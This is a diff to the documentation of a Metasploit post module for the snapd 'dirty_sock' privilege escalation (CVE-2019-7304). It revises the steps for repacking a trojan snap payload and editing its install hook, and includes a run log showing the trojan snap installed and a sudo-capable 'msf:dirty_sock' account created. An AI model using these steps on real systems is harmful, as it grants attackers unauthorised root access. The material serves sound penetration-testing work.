@@ -42,15 +42,12 @@ password.  However, it is relatively easy to edit the payload
 
 To create a new payload:
 
-1. From bash (replace empty quote with SNAP option value): `echo '' | base64 -d > /tmp/snap_payload`
-2. `unsquashfs -l /tmp/snap_payload` # double check files are there and decode was good
-3. `mkdir /tmp/snap_squash; cd /tmp/snap_squash`
-4. `sudo unsquashfs /tmp/snap_payload`
-5. Make any changes you want. This will most likely be in the `squashfs-root/meta/hooks/install`
+1. `mkdir /tmp/snap_squash; cd /tmp/snap_squash`
+2. `sudo unsquashfs <metasploit_root>/data/exploits/CVE-2019-7304/squash.fs`
+3. Make any changes you want. This will most likely be in the `squashfs-root/meta/hooks/install`
 or `squashfs-root/meta/snap.yaml` files
-6. `mksquashfs /tmp/snap_squash/squashfs-root/ /tmp/snap_payload`
-7. `cat /tmp/snap_payload | base64` # copy this to your clipboard
-8. You will now do a `set option SNAP '<insert copy and pasted content here>'`
+4. `mksquashfs /tmp/snap_squash/squashfs-root/ /tmp/snap_payload`
+5. Now within metasploit after loading the module `set squash /tmp/snap_payload`
 
 ## Verification Steps
 
@@ -63,9 +60,9 @@ or `squashfs-root/meta/snap.yaml` files
 
 ## Options
 
-### SNAP
+### SQUASH
 
-This is a base64 encoded snap package. See instructions in this document to modify it.
+This is the squashFS file with a snap package. See instructions in this document to modify it.
 
 ## Scenarios
 
@@ -111,7 +108,7 @@ resource (snapd.rb)> run
 [*] [+] Installing the trojan snap (and sleeping 8 seconds)...
 [*] [+] Deleting trojan snap (and sleeping 5 seconds)...
 [*] Success!
-[+] Success! You can now login and sudo with msf:dirty_sock or whatever credentials were included in the snap option. However it may take several minutes for the account to finish creation.
+[+] Success! You can now login and sudo with msf:dirty_sock. However it may take several minutes for the account to finish creation.
 [*] Post module execution completed
 resource (snapd.rb)> sleep 30
 ```
